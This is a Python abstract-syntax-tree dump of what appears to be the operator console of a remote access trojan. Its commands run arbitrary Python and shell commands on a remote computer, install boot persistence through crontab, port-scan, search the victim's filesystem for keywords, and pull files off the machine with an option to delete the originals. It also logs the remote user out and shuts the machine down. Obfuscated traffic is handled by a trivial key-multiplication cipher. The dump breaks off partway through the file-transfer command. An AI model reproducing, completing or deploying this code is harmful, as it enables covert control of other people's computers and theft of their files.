Module(body=[Assign(targets=[Name(id='__version__', ctx=Store())], value=Str(s='0.5')), Assign(targets=[Name(id='__author__', ctx=Store())], value=Str(s='Yoav Rafalin')), Import(names=[alias(name='socket', asname=None), alias(name='random', asname=None), alias(name='cmd', asname=None), alias(name='argparse', asname=None), alias(name='os', asname=None)]), Assign(targets=[Name(id='IP', ctx=Store())], value=Str(s='127.0.0.1')), Assign(targets=[Name(id='PORT', ctx=Store())], value=Num(n=6000)), Assign(targets=[Name(id='KEY', ctx=Store())], value=Call(func=Attribute(value=Name(id='random', ctx=Load()), attr='randrange', ctx=Load()), args=[Num(n=0), BinOp(left=Num(n=2), op=Pow(), right=Num(n=12))], keywords=[])), Assign(targets=[Name(id='runmode', ctx=Store())], value=Call(func=Attribute(value=Name(id='argparse', ctx=Load()), attr='ArgumentParser', ctx=Load()), args=[], keywords=[keyword(arg='description', value=Str(s='Get runmode'))])), Expr(value=Call(func=Attribute(value=Name(id='runmode', ctx=Load()), attr='add_argument', ctx=Load()), args=[Str(s='-a'), Str(s='--active')], keywords=[keyword(arg='action', value=Str(s='store_true'))])), Expr(value=Call(func=Attribute(value=Name(id='runmode', ctx=Load()), attr='add_argument', ctx=Load()), args=[Str(s='-p'), Str(s='--passive')], keywords=[keyword(arg='action', value=Str(s='store_true'))])), Expr(value=Call(func=Attribute(value=Name(id='runmode', ctx=Load()), attr='add_argument', ctx=Load()), args=[Str(s='-r'), Str(s='--reactive')], keywords=[keyword(arg='action', value=Str(s='store_true'))])), Assign(targets=[Name(id='MODE', ctx=Store())], value=Call(func=Name(id='vars', ctx=Load()), args=[Call(func=Attribute(value=Name(id='runmode', ctx=Load()), attr='parse_args', ctx=Load()), args=[], keywords=[])], keywords=[])), FunctionDef(name='encode_with_key', args=arguments(args=[arg(arg='string_to_encode', annotation=None), arg(arg='key', annotation=None)], vararg=None, kwonlyargs=[], kw_defaults=[], kwarg=None, defaults=[Name(id='KEY', ctx=Load())]), body=[Expr(value=Str(s='Encrypts a string with this algorithm.')), Assign(targets=[Name(id='list_of_numbers', ctx=Store())], value=List(elts=[], ctx=Load())), For(target=Name(id='letter', ctx=Store()), iter=Name(id='string_to_encode', ctx=Load()), body=[Expr(value=Call(func=Attribute(value=Name(id='list_of_numbers', ctx=Load()), attr='append', ctx=Load()), args=[Call(func=Name(id='str', ctx=Load()), args=[BinOp(left=Call(func=Name(id='ord', ctx=Load()), args=[Name(id='letter', ctx=Load())], keywords=[]), op=Mult(), right=Name(id='key', ctx=Load()))], keywords=[])], keywords=[]))], orelse=[]), Return(value=Call(func=Attribute(value=Call(func=Attribute(value=Str(s=' '), attr='join', ctx=Load()), args=[Name(id='list_of_numbers', ctx=Load())], keywords=[]), attr='encode', ctx=Load()), args=[], keywords=[]))], decorator_list=[], returns=None), FunctionDef(name='decode_with_key', args=arguments(args=[arg(arg='bytes_to_decode', annotation=None), arg(arg='key', annotation=None)], vararg=None, kwonlyargs=[], kw_defaults=[], kwarg=None, defaults=[Name(id='KEY', ctx=Load())]), body=[Expr(value=Str(s='Decodes a bytes message encrypted with this algorithm.')), Assign(targets=[Name(id='string_of_bytes', ctx=Store())], value=Str(s='')), Assign(targets=[Name(id='list_of_bytes', ctx=Store())], value=Call(func=Attribute(value=Call(func=Attribute(value=Name(id='bytes_to_decode', ctx=Load()), attr='decode', ctx=Load()), args=[Str(s='utf-8')], keywords=[]), attr='split', ctx=Load()), args=[], keywords=[])), For(target=Name(id='letter', ctx=Store()), iter=Name(id='list_of_bytes', ctx=Load()), body=[AugAssign(target=Name(id='string_of_bytes', ctx=Store()), op=Add(), value=Call(func=Name(id='chr', ctx=Load()), args=[Call(func=Name(id='int', ctx=Load()), args=[BinOp(left=Call(func=Name(id='int', ctx=Load()), args=[Name(id='letter', ctx=Load())], keywords=[]), op=FloorDiv(), right=Name(id='key', ctx=Load()))], keywords=[])], keywords=[]))], orelse=[]), Return(value=Name(id='string_of_bytes', ctx=Load()))], decorator_list=[], returns=None), FunctionDef(name='send_message', args=arguments(args=[arg(arg='message_to_send', annotation=None), arg(arg='key', annotation=None), arg(arg='connection', annotation=None), arg(arg='lenoflenofmsg', annotation=None)], vararg=None, kwonlyargs=[], kw_defaults=[], kwarg=None, defaults=[Num(n=5)]), body=[Expr(value=Str(s='Does the sending protocol.')), If(test=Compare(left=Name(id='key', ctx=Load()), ops=[Eq()], comparators=[NameConstant(value=None)]), body=[Assign(targets=[Name(id='message', ctx=Store())], value=Call(func=Attribute(value=Call(func=Name(id='str', ctx=Load()), args=[Name(id='message_to_send', ctx=Load())], keywords=[]), attr='encode', ctx=Load()), args=[], keywords=[]))], orelse=[Assign(targets=[Name(id='message', ctx=Store())], value=Call(func=Name(id='encode_with_key', ctx=Load()), args=[Call(func=Name(id='str', ctx=Load()), args=[Name(id='message_to_send', ctx=Load())], keywords=[]), Call(func=Name(id='int', ctx=Load()), args=[Name(id='key', ctx=Load())], keywords=[])], keywords=[]))]), Assign(targets=[Name(id='length_of_msg', ctx=Store())], value=Call(func=Name(id='str', ctx=Load()), args=[Call(func=Name(id='len', ctx=Load()), args=[Name(id='message', ctx=Load())], keywords=[])], keywords=[])), Assign(targets=[Name(id='length_of_msg', ctx=Store())], value=BinOp(left=BinOp(left=Str(s='0'), op=Mult(), right=BinOp(left=Name(id='lenoflenofmsg', ctx=Load()), op=Sub(), right=Call(func=Name(id='len', ctx=Load()), args=[Name(id='length_of_msg', ctx=Load())], keywords=[]))), op=Add(), right=Name(id='length_of_msg', ctx=Load()))), Expr(value=Call(func=Attribute(value=Name(id='connection', ctx=Load()), attr='send', ctx=Load()), args=[Call(func=Attribute(value=Name(id='length_of_msg', ctx=Load()), attr='encode', ctx=Load()), args=[], keywords=[])], keywords=[])), Expr(value=Call(func=Attribute(value=Name(id='connection', ctx=Load()), attr='send', ctx=Load()), args=[Name(id='message', ctx=Load())], keywords=[])), Return(value=Tuple(elts=[Name(id='message', ctx=Load()), Name(id='length_of_msg', ctx=Load())], ctx=Load()))], decorator_list=[], returns=None), FunctionDef(name='recv_message', args=arguments(args=[arg(arg='key', annotation=None), arg(arg='connection', annotation=None), arg(arg='lenoflenofmsg', annotation=None)], vararg=None, kwonlyargs=[], kw_defaults=[], kwarg=None, defaults=[Num(n=5)]), body=[Expr(value=Str(s='Does the receiving protocol.')), Assign(targets=[Name(id='length_of_msg', ctx=Store())], value=Call(func=Name(id='int', ctx=Load()), args=[Call(func=Attribute(value=Call(func=Attribute(value=Name(id='connection', ctx=Load()), attr='recv', ctx=Load()), args=[Name(id='lenoflenofmsg', ctx=Load())], keywords=[]), attr='decode', ctx=Load()), args=[Str(s='utf-8')], keywords=[])], keywords=[])), If(test=Compare(left=Name(id='key', ctx=Load()), ops=[Eq()], comparators=[NameConstant(value=None)]), body=[Assign(targets=[Name(id='message', ctx=Store())], value=Call(func=Attribute(value=Call(func=Attribute(value=Name(id='connection', ctx=Load()), attr='recv', ctx=Load()), args=[Name(id='length_of_msg', ctx=Load())], keywords=[]), attr='decode', ctx=Load()), args=[Str(s='utf-8')], keywords=[]))], orelse=[Assign(targets=[Name(id='message', ctx=Store())], value=Call(func=Name(id='decode_with_key', ctx=Load()), args=[Call(func=Attribute(value=Name(id='connection', ctx=Load()), attr='recv', ctx=Load()), args=[Name(id='length_of_msg', ctx=Load())], keywords=[]), Call(func=Name(id='int', ctx=Load()), args=[Name(id='key', ctx=Load())], keywords=[])], keywords=[]))]), Return(value=Name(id='message', ctx=Load()))], decorator_list=[], returns=None), FunctionDef(name='recv_chunk_transfer', args=arguments(args=[arg(arg='file_path', annotation=None), arg(arg='chunk_sizes', annotation=None), arg(arg='connection', annotation=None), arg(arg='key', annotation=None)], vararg=None, kwonlyargs=[], kw_defaults=[], kwarg=None, defaults=[]), body=[Try(body=[Assign(targets=[Name(id='chunk_numbers', ctx=Store())], value=Call(func=Attribute(value=Call(func=Name(id='recv_message', ctx=Load()), args=[Name(id='key', ctx=Load()), Name(id='connection', ctx=Load())], keywords=[]), attr='split', ctx=Load()), args=[], keywords=[])), Assign(targets=[Name(id='local_file', ctx=Store())], value=Call(func=Name(id='open', ctx=Load()), args=[Name(id='file_path', ctx=Load())], keywords=[keyword(arg='mode', value=Str(s='wb'))])), Assign(targets=[Name(id='cycle', ctx=Store())], value=Num(n=0)), For(target=Name(id='num', ctx=Store()), iter=Name(id='chunk_numbers', ctx=Load()), body=[For(target=Name(id='chunk', ctx=Store()), iter=Call(func=Name(id='range', ctx=Load()), args=[Call(func=Name(id='int', ctx=Load()), args=[Name(id='num', ctx=Load())], keywords=[])], keywords=[]), body=[Expr(value=Call(func=Attribute(value=Name(id='local_file', ctx=Load()), attr='write', ctx=Load()), args=[Call(func=Attribute(value=Name(id='connection', ctx=Load()), attr='recv', ctx=Load()), args=[Subscript(value=Name(id='chunk_sizes', ctx=Load()), slice=Index(value=Name(id='cycle', ctx=Load())), ctx=Load())], keywords=[])], keywords=[]))], orelse=[]), AugAssign(target=Name(id='cycle', ctx=Store()), op=Add(), value=Num(n=1))], orelse=[]), Expr(value=Call(func=Attribute(value=Name(id='local_file', ctx=Load()), attr='close', ctx=Load()), args=[], keywords=[])), Return(value=Str(s='File transfer succeeded.'))], handlers=[ExceptHandler(type=Name(id='Exception', ctx=Load()), name='e', body=[Return(value=Tuple(elts=[Str(s='File failed.'), Name(id='e', ctx=Load())], ctx=Load()))])], orelse=[], finalbody=[])], decorator_list=[], returns=None), ClassDef(name='send_commands', bases=[Attribute(value=Name(id='cmd', ctx=Load()), attr='Cmd', ctx=Load())], keywords=[], body=[Assign(targets=[Name(id='intro', ctx=Store())], value=Str(s='Run commands on other computer. Type help for help.')), Assign(targets=[Name(id='prompt', ctx=Store())], value=Str(s='Enter command: ')), FunctionDef(name='cmdloop', args=arguments(args=[arg(arg='self', annotation=None), arg(arg='client', annotation=None), arg(arg='system', annotation=None), arg(arg='key', annotation=None)], vararg=None, kwonlyargs=[], kw_defaults=[], kwarg=None, defaults=[Name(id='KEY', ctx=Load())]), body=[Assign(targets=[Attribute(value=Name(id='self', ctx=Load()), attr='key', ctx=Store())], value=Name(id='key', ctx=Load())), Assign(targets=[Attribute(value=Name(id='self', ctx=Load()), attr='client', ctx=Store())], value=Name(id='client', ctx=Load())), Assign(targets=[Attribute(value=Name(id='self', ctx=Load()), attr='system', ctx=Store())], value=Name(id='system', ctx=Load())), Assign(targets=[Name(id='intro', ctx=Store())], value=NameConstant(value=None)), Return(value=Call(func=Attribute(value=Attribute(value=Name(id='cmd', ctx=Load()), attr='Cmd', ctx=Load()), attr='cmdloop', ctx=Load()), args=[Name(id='self', ctx=Load()), Name(id='intro', ctx=Load())], keywords=[]))], decorator_list=[], returns=None), FunctionDef(name='do_exit', args=arguments(args=[arg(arg='self', annotation=None), arg(arg='arg', annotation=None)], vararg=None, kwonlyargs=[], kw_defaults=[], kwarg=None, defaults=[]), body=[Expr(value=Str(s='Exit program.')), Assign(targets=[Tuple(elts=[Name(id='message', ctx=Store()), Name(id='length_of_msg', ctx=Store())], ctx=Store())], value=Call(func=Name(id='send_message', ctx=Load()), args=[Str(s='exit'), Attribute(value=Name(id='self', ctx=Load()), attr='key', ctx=Load()), Attribute(value=Name(id='self', ctx=Load()), attr='client', ctx=Load())], keywords=[])), Return(value=NameConstant(value=True))], decorator_list=[], returns=None), FunctionDef(name='do_loggedin', args=arguments(args=[arg(arg='self', annotation=None), arg(arg='arg', annotation=None)], vararg=None, kwonlyargs=[], kw_defaults=[], kwarg=None, defaults=[]), body=[Expr(value=Str(s='Get current logged in user.')), Assign(targets=[Tuple(elts=[Name(id='message', ctx=Store()), Name(id='length_of_msg', ctx=Store())], ctx=Store())], value=Call(func=Name(id='send_message', ctx=Load()), args=[Str(s='loggedin'), Attribute(value=Name(id='self', ctx=Load()), attr='key', ctx=Load()), Attribute(value=Name(id='self', ctx=Load()), attr='client', ctx=Load())], keywords=[])), Expr(value=Call(func=Name(id='print', ctx=Load()), args=[Str(s='length_of_msg'), Name(id='length_of_msg', ctx=Load())], keywords=[])), Expr(value=Call(func=Name(id='print', ctx=Load()), args=[Call(func=Name(id='recv_message', ctx=Load()), args=[Attribute(value=Name(id='self', ctx=Load()), attr='key', ctx=Load()), Attribute(value=Name(id='self', ctx=Load()), attr='client', ctx=Load())], keywords=[])], keywords=[]))], decorator_list=[], returns=None), FunctionDef(name='do_WHOAMI', args=arguments(args=[arg(arg='self', annotation=None), arg(arg='arg', annotation=None)], vararg=None, kwonlyargs=[], kw_defaults=[], kwarg=None, defaults=[]), body=[Expr(value=Str(s='Get current logged in user.')), Assign(targets=[Tuple(elts=[Name(id='message', ctx=Store()), Name(id='length_of_msg', ctx=Store())], ctx=Store())], value=Call(func=Name(id='send_message', ctx=Load()), args=[Str(s='WHOAMI'), Attribute(value=Name(id='self', ctx=Load()), attr='key', ctx=Load()), Attribute(value=Name(id='self', ctx=Load()), attr='client', ctx=Load())], keywords=[])), Expr(value=Call(func=Name(id='print', ctx=Load()), args=[Str(s='length_of_msg'), Name(id='length_of_msg', ctx=Load())], keywords=[])), Expr(value=Call(func=Name(id='print', ctx=Load()), args=[Call(func=Name(id='recv_message', ctx=Load()), args=[Attribute(value=Name(id='self', ctx=Load()), attr='key', ctx=Load()), Attribute(value=Name(id='self', ctx=Load()), attr='client', ctx=Load())], keywords=[])], keywords=[]))], decorator_list=[], returns=None), FunctionDef(name='do_volume', args=arguments(args=[arg(arg='self', annotation=None), arg(arg='arg', annotation=None)], vararg=None, kwonlyargs=[], kw_defaults=[], kwarg=None, defaults=[]), body=[Expr(value=Str(s='Set volume.')), If(test=Compare(left=Attribute(value=Name(id='self', ctx=Load()), attr='system', ctx=Load()), ops=[Eq()], comparators=[Str(s='Darwin')]), body=[Assign(targets=[Tuple(elts=[Name(id='message', ctx=Store()), Name(id='length_of_msg', ctx=Store())], ctx=Store())], value=Call(func=Name(id='send_message', ctx=Load()), args=[BinOp(left=Str(s='volume '), op=Add(), right=Name(id='arg', ctx=Load())), Attribute(value=Name(id='self', ctx=Load()), attr='key', ctx=Load()), Attribute(value=Name(id='self', ctx=Load()), attr='client', ctx=Load())], keywords=[])), Expr(value=Call(func=Name(id='print', ctx=Load()), args=[Str(s='length_of_msg'), Name(id='length_of_msg', ctx=Load())], keywords=[]))], orelse=[Expr(value=Call(func=Name(id='print', ctx=Load()), args=[Call(func=Attribute(value=Str(s='Action not available with {system}.'), attr='format', ctx=Load()), args=[], keywords=[keyword(arg='system', value=Attribute(value=Name(id='self', ctx=Load()), attr='system', ctx=Load()))])], keywords=[]))])], decorator_list=[], returns=None), FunctionDef(name='do_say', args=arguments(args=[arg(arg='self', annotation=None), arg(arg='arg', annotation=None)], vararg=None, kwonlyargs=[], kw_defaults=[], kwarg=None, defaults=[]), body=[Expr(value=Str(s='Announce a phrase on the server.')), If(test=Compare(left=Attribute(value=Name(id='self', ctx=Load()), attr='system', ctx=Load()), ops=[Eq()], comparators=[Str(s='Darwin')]), body=[Assign(targets=[Tuple(elts=[Name(id='message', ctx=Store()), Name(id='length_of_msg', ctx=Store())], ctx=Store())], value=Call(func=Name(id='send_message', ctx=Load()), args=[BinOp(left=Str(s='say '), op=Add(), right=Name(id='arg', ctx=Load())), Attribute(value=Name(id='self', ctx=Load()), attr='key', ctx=Load()), Attribute(value=Name(id='self', ctx=Load()), attr='client', ctx=Load())], keywords=[])), Expr(value=Call(func=Name(id='print', ctx=Load()), args=[Str(s='length_of_msg'), Name(id='length_of_msg', ctx=Load())], keywords=[]))], orelse=[Expr(value=Call(func=Name(id='print', ctx=Load()), args=[Call(func=Attribute(value=Str(s='Action not available with {system}.'), attr='format', ctx=Load()), args=[], keywords=[keyword(arg='system', value=Attribute(value=Name(id='self', ctx=Load()), attr='system', ctx=Load()))])], keywords=[]))])], decorator_list=[], returns=None), FunctionDef(name='do_logout', args=arguments(args=[arg(arg='self', annotation=None), arg(arg='arg', annotation=None)], vararg=None, kwonlyargs=[], kw_defaults=[], kwarg=None, defaults=[]), body=[Expr(value=Str(s='Logout the other computer.')), If(test=BoolOp(op=Or(), values=[Compare(left=Attribute(value=Name(id='self', ctx=Load()), attr='system', ctx=Load()), ops=[Eq()], comparators=[Str(s='Windows')]), Compare(left=Attribute(value=Name(id='self', ctx=Load()), attr='system', ctx=Load()), ops=[Eq()], comparators=[Str(s='Darwin')])]), body=[Assign(targets=[Tuple(elts=[Name(id='message', ctx=Store()), Name(id='length_of_msg', ctx=Store())], ctx=Store())], value=Call(func=Name(id='send_message', ctx=Load()), args=[Str(s='logout'), Attribute(value=Name(id='self', ctx=Load()), attr='key', ctx=Load()), Attribute(value=Name(id='self', ctx=Load()), attr='client', ctx=Load())], keywords=[])), Expr(value=Call(func=Name(id='print', ctx=Load()), args=[Str(s='length_of_msg'), Name(id='length_of_msg', ctx=Load())], keywords=[]))], orelse=[Expr(value=Call(func=Name(id='print', ctx=Load()), args=[Call(func=Attribute(value=Str(s='Action not available with {system}.'), attr='format', ctx=Load()), args=[], keywords=[keyword(arg='system', value=Attribute(value=Name(id='self', ctx=Load()), attr='system', ctx=Load()))])], keywords=[]))])], decorator_list=[], returns=None), FunctionDef(name='do_shutdown', args=arguments(args=[arg(arg='self', annotation=None), arg(arg='arg', annotation=None)], vararg=None, kwonlyargs=[], kw_defaults=[], kwarg=None, defaults=[]), body=[Expr(value=Str(s='Shutdown the other computer.')), If(test=BoolOp(op=Or(), values=[Compare(left=Attribute(value=Name(id='self', ctx=Load()), attr='system', ctx=Load()), ops=[Eq()], comparators=[Str(s='Windows')]), Compare(left=Attribute(value=Name(id='self', ctx=Load()), attr='system', ctx=Load()), ops=[Eq()], comparators=[Str(s='Darwin')])]), body=[Assign(targets=[Tuple(elts=[Name(id='message', ctx=Store()), Name(id='length_of_msg', ctx=Store())], ctx=Store())], value=Call(func=Name(id='send_message', ctx=Load()), args=[Str(s='shutdown'), Attribute(value=Name(id='self', ctx=Load()), attr='key', ctx=Load()), Attribute(value=Name(id='self', ctx=Load()), attr='client', ctx=Load())], keywords=[])), Expr(value=Call(func=Name(id='print', ctx=Load()), args=[Str(s='length_of_msg'), Name(id='length_of_msg', ctx=Load())], keywords=[]))], orelse=[Expr(value=Call(func=Name(id='print', ctx=Load()), args=[Call(func=Attribute(value=Str(s='Action not available with {system}.'), attr='format', ctx=Load()), args=[], keywords=[keyword(arg='system', value=Attribute(value=Name(id='self', ctx=Load()), attr='system', ctx=Load()))])], keywords=[]))])], decorator_list=[], returns=None), FunctionDef(name='do_sleep', args=arguments(args=[arg(arg='self', annotation=None), arg(arg='arg', annotation=None)], vararg=None, kwonlyargs=[], kw_defaults=[], kwarg=None, defaults=[]), body=[Expr(value=Str(s='Sleep the other computer.')), If(test=BoolOp(op=Or(), values=[Compare(left=Attribute(value=Name(id='self', ctx=Load()), attr='system', ctx=Load()), ops=[Eq()], comparators=[Str(s='Windows')]), Compare(left=Attribute(value=Name(id='self', ctx=Load()), attr='system', ctx=Load()), ops=[Eq()], comparators=[Str(s='Darwin')]), Compare(left=Attribute(value=Name(id='self', ctx=Load()), attr='system', ctx=Load()), ops=[Eq()], comparators=[Str(s='Linux')])]), body=[Assign(targets=[Tuple(elts=[Name(id='message', ctx=Store()), Name(id='length_of_msg', ctx=Store())], ctx=Store())], value=Call(func=Name(id='send_message', ctx=Load()), args=[Str(s='sleep'), Attribute(value=Name(id='self', ctx=Load()), attr='key', ctx=Load()), Attribute(value=Name(id='self', ctx=Load()), attr='client', ctx=Load())], keywords=[])), Expr(value=Call(func=Name(id='print', ctx=Load()), args=[Str(s='length_of_msg'), Name(id='length_of_msg', ctx=Load())], keywords=[]))], orelse=[Expr(value=Call(func=Name(id='print', ctx=Load()), args=[Call(func=Attribute(value=Str(s='Action not available with {system}.'), attr='format', ctx=Load()), args=[], keywords=[keyword(arg='system', value=Attribute(value=Name(id='self', ctx=Load()), attr='system', ctx=Load()))])], keywords=[]))])], decorator_list=[], returns=None), FunctionDef(name='do_exec', args=arguments(args=[arg(arg='self', annotation=None), arg(arg='arg', annotation=None)], vararg=None, kwonlyargs=[], kw_defaults=[], kwarg=None, defaults=[]), body=[Expr(value=Str(s='Run python code on the other computer.')), Assign(targets=[Tuple(elts=[Name(id='message', ctx=Store()), Name(id='length_of_msg', ctx=Store())], ctx=Store())], value=Call(func=Name(id='send_message', ctx=Load()), args=[BinOp(left=Str(s='exec '), op=Add(), right=Name(id='arg', ctx=Load())), Attribute(value=Name(id='self', ctx=Load()), attr='key', ctx=Load()), Attribute(value=Name(id='self', ctx=Load()), attr='client', ctx=Load())], keywords=[])), Expr(value=Call(func=Name(id='print', ctx=Load()), args=[Str(s='length_of_msg'), Name(id='length_of_msg', ctx=Load())], keywords=[]))], decorator_list=[], returns=None), FunctionDef(name='do_cmd', args=arguments(args=[arg(arg='self', annotation=None), arg(arg='arg', annotation=None)], vararg=None, kwonlyargs=[], kw_defaults=[], kwarg=None, defaults=[]), body=[Expr(value=Str(s='Run a command on the server.')), Assign(targets=[Tuple(elts=[Name(id='message', ctx=Store()), Name(id='length_of_msg', ctx=Store())], ctx=Store())], value=Call(func=Name(id='send_message', ctx=Load()), args=[BinOp(left=Str(s='cmd '), op=Add(), right=Name(id='arg', ctx=Load())), Attribute(value=Name(id='self', ctx=Load()), attr='key', ctx=Load()), Attribute(value=Name(id='self', ctx=Load()), attr='client', ctx=Load())], keywords=[])), Expr(value=Call(func=Name(id='print', ctx=Load()), args=[Str(s='length_of_msg'), Name(id='length_of_msg', ctx=Load())], keywords=[])), Expr(value=Call(func=Name(id='print', ctx=Load()), args=[Call(func=Name(id='recv_message', ctx=Load()), args=[Attribute(value=Name(id='self', ctx=Load()), attr='key', ctx=Load()), Attribute(value=Name(id='self', ctx=Load()), attr='client', ctx=Load())], keywords=[])], keywords=[]))], decorator_list=[], returns=None), FunctionDef(name='do_pers', args=arguments(args=[arg(arg='self', annotation=None), arg(arg='arg', annotation=None)], vararg=None, kwonlyargs=[], kw_defaults=[], kwarg=None, defaults=[]), body=[Expr(value=Str(s='Set file to run on boot (put in crontab).')), Assign(targets=[Tuple(elts=[Name(id='message', ctx=Store()), Name(id='length_of_msg', ctx=Store())], ctx=Store())], value=Call(func=Name(id='send_message', ctx=Load()), args=[Str(s='pers'), Attribute(value=Name(id='self', ctx=Load()), attr='key', ctx=Load()), Attribute(value=Name(id='self', ctx=Load()), attr='client', ctx=Load())], keywords=[])), Expr(value=Call(func=Name(id='print', ctx=Load()), args=[Str(s='length_of_msg'), Name(id='length_of_msg', ctx=Load())], keywords=[])), Expr(value=Call(func=Name(id='print', ctx=Load()), args=[Call(func=Name(id='recv_message', ctx=Load()), args=[Attribute(value=Name(id='self', ctx=Load()), attr='key', ctx=Load()), Attribute(value=Name(id='self', ctx=Load()), attr='client', ctx=Load())], keywords=[])], keywords=[]))], decorator_list=[], returns=None), FunctionDef(name='do_dir', args=arguments(args=[arg(arg='self', annotation=None), arg(arg='arg', annotation=None)], vararg=None, kwonlyargs=[], kw_defaults=[], kwarg=None, defaults=[]), body=[Expr(value=Str(s='See directory contents.')), Assign(targets=[Tuple(elts=[Name(id='message', ctx=Store()), Name(id='length_of_msg', ctx=Store())], ctx=Store())], value=Call(func=Name(id='send_message', ctx=Load()), args=[BinOp(left=Str(s='dir '), op=Add(), right=Name(id='arg', ctx=Load())), Attribute(value=Name(id='self', ctx=Load()), attr='key', ctx=Load()), Attribute(value=Name(id='self', ctx=Load()), attr='client', ctx=Load())], keywords=[])), Expr(value=Call(func=Name(id='print', ctx=Load()), args=[Str(s='length_of_msg'), Name(id='length_of_msg', ctx=Load())], keywords=[])), Expr(value=Call(func=Name(id='print', ctx=Load()), args=[BinOp(left=Str(s='\n'), op=Add(), right=Call(func=Name(id='recv_message', ctx=Load()), args=[Attribute(value=Name(id='self', ctx=Load()), attr='key', ctx=Load()), Attribute(value=Name(id='self', ctx=Load()), attr='client', ctx=Load())], keywords=[]))], keywords=[]))], decorator_list=[], returns=None), FunctionDef(name='do_portscan', args=arguments(args=[arg(arg='self', annotation=None), arg(arg='arg', annotation=None)], vararg=None, kwonlyargs=[], kw_defaults=[], kwarg=None, defaults=[]), body=[Expr(value=Str(s='Scan ports set as range or as number. If none provided, will scan for well known ports. This may take a while.')), Assign(targets=[Tuple(elts=[Name(id='message', ctx=Store()), Name(id='length_of_msg', ctx=Store())], ctx=Store())], value=Call(func=Name(id='send_message', ctx=Load()), args=[BinOp(left=Str(s='portscan '), op=Add(), right=Name(id='arg', ctx=Load())), Attribute(value=Name(id='self', ctx=Load()), attr='key', ctx=Load()), Attribute(value=Name(id='self', ctx=Load()), attr='client', ctx=Load())], keywords=[])), Expr(value=Call(func=Name(id='print', ctx=Load()), args=[Str(s='length_of_msg'), Name(id='length_of_msg', ctx=Load())], keywords=[])), Expr(value=Call(func=Name(id='print', ctx=Load()), args=[Call(func=Name(id='recv_message', ctx=Load()), args=[Attribute(value=Name(id='self', ctx=Load()), attr='key', ctx=Load()), Attribute(value=Name(id='self', ctx=Load()), attr='client', ctx=Load())], keywords=[])], keywords=[]))], decorator_list=[], returns=None), FunctionDef(name='do_searchword', args=arguments(args=[arg(arg='self', annotation=None), arg(arg='arg', annotation=None)], vararg=None, kwonlyargs=[], kw_defaults=[], kwarg=None, defaults=[]), body=[Expr(value=Str(s='Search the filesystem for a keyword. Use the syntax "<keyword> in <directory to search>".')), Assign(targets=[Tuple(elts=[Name(id='message', ctx=Store()), Name(id='length_of_msg', ctx=Store())], ctx=Store())], value=Call(func=Name(id='send_message', ctx=Load()), args=[BinOp(left=Str(s='searchword '), op=Add(), right=Name(id='arg', ctx=Load())), Attribute(value=Name(id='self', ctx=Load()), attr='key', ctx=Load()), Attribute(value=Name(id='self', ctx=Load()), attr='client', ctx=Load())], keywords=[])), Expr(value=Call(func=Name(id='print', ctx=Load()), args=[Str(s='length_of_msg'), Name(id='length_of_msg', ctx=Load())], keywords=[])), Expr(value=Call(func=Name(id='print', ctx=Load()), args=[BinOp(left=Str(s='\n'), op=Add(), right=Call(func=Name(id='recv_message', ctx=Load()), args=[Attribute(value=Name(id='self', ctx=Load()), attr='key', ctx=Load()), Attribute(value=Name(id='self', ctx=Load()), attr='client', ctx=Load())], keywords=[]))], keywords=[]))], decorator_list=[], returns=None), FunctionDef(name='do_stream', args=arguments(args=[arg(arg='self', annotation=None), arg(arg='arg', annotation=None)], vararg=None, kwonlyargs=[], kw_defaults=[], kwarg=None, defaults=[]), body=[Expr(value=Str(s="Stream file from server to local directory. Add the path to file and 'del' in front if you would like it deleted on the server afterwards.")), Assign(targets=[Tuple(elts=[Name(id='message', ctx=Store()), Name(id='length_of_msg', ctx=Store())], ctx=Store())], value=Call(func=Name(id='send_message', ctx=Load()), args=[BinOp(left=Str(s='stream '), op=Add(), right=Name(id='arg', ctx=Load())), Attribute(value=Name(id='self', ctx=Load()), attr='key', ctx=Load()), Attribute(value=Name(id='self', ctx=Load()), attr='client', ctx=Load())], keywords=[])), Expr(value=Call(func=Name(id='print', ctx=Load()), args=[Str(s='length_of_msg'), Name(id='length_of_msg', ctx=Load())], keywords=[])), Assign(targets=[Name(id='message', ctx=Store())], value=Call(func=Name(id='recv_message', ctx=Load()), args=[Attribute(value=Name(id='self', ctx=Load()), attr='key', ctx=Load()), Attribute(value=Name(id='self', ctx=Load()), attr='client', ctx=Load())], keywords=[])), Expr(value=Call(func=Name(id='print', ctx=Load()), args=[Name(id='message', ctx=Load())], keywords=[])), If(test=Compare(left=Name(id='message', ctx=Load()), ops=[Eq()], comparators=[Str(s='That file exists and will be streamed over.')]), body=[Assign(targets=[Name(id='local_file', ctx=Store())], value=Call(func=Name(id='open', ctx=Load()), args=[Call(func=Attribute(value=Str(s='./{}'), attr='format', ctx=Load()), args=[Subscript(value=Call(func=Attribute(value=Name(id='arg', ctx=Load()), attr='split', ctx=Load()), args=[Str(s='/')], keywords=[]), slice=Index(value=UnaryOp(op=USub(), operand=Num(n=1))), ctx=Load())], keywords=[])], keywords=[keyword(arg='mode', value=Str(s='wb'))])), While(test=NameConstant(value=True), body=[Assign(targets=[Name(id='message', ctx=Store())], value=Call(func=Attribute(value=Attribute(value=Name(id='self', ctx=Load()), attr='client', ctx=Load()), attr='recv', ctx=Load()), args=[Num(n=516)], keywords=[])), Assign(targets=[Name(id='metadata', ctx=Store())], value=Call(func=Attribute(value=Subscript(value=Name(id='message', ctx=Load()), slice=Slice(lower=None, upper=Num(n=4), step=None), ctx=Load()), attr='decode', ctx=Load()), args=[Str(s='utf-8')], keywords=[])), Expr(value=Call(func=Attribute(value=Name(id='local_file', ctx=Load()), attr='write', ctx=Load()), args=[Subscript(value=Name(id='message', ctx=Load()), slice=Slice(lower=Num(n=4), upper=BinOp(left=Num(n=516), op=Sub(), right=Call(func=Name(id='int', ctx=Load()), args=[Subscript(value=Name(id='metadata', ctx=Load()), slice=Slice(lower=Num(n=1), upper=None, step=None), ctx=Load())], keywords=[])), step=None), ctx=Load())], keywords=[])), If(test=Compare(left=Subscript(value=Name(id='metadata', ctx=Load()), slice=Slice(lower=None, upper=Num(n=1), step=None), ctx=Load()), ops=[Eq()], comparators=[Str(s='1')]), body=[Break()], orelse=[])], orelse=[]), Expr(value=Call(func=Attribute(value=Name(id='local_file', ctx=Load()), attr='close', ctx=Load()), args=[], keywords=[]))], orelse=[])], decorator_list=[], returns=None), FunctionDef(name='do_transfer', args=arguments(args=[arg(arg='self', annotation=None), arg(arg='arg', annotation=None)], vararg=None, kwonlyargs=[], kw_defaults=[], kwarg=None, defaults=[]), body=[Expr(value=Str(s="Transfer file from server to local directory. Add the path to file and 'del' in front if you would like it deleted on the server afterwards.")), Assign(targets=[Name(id='chunk_sizes', 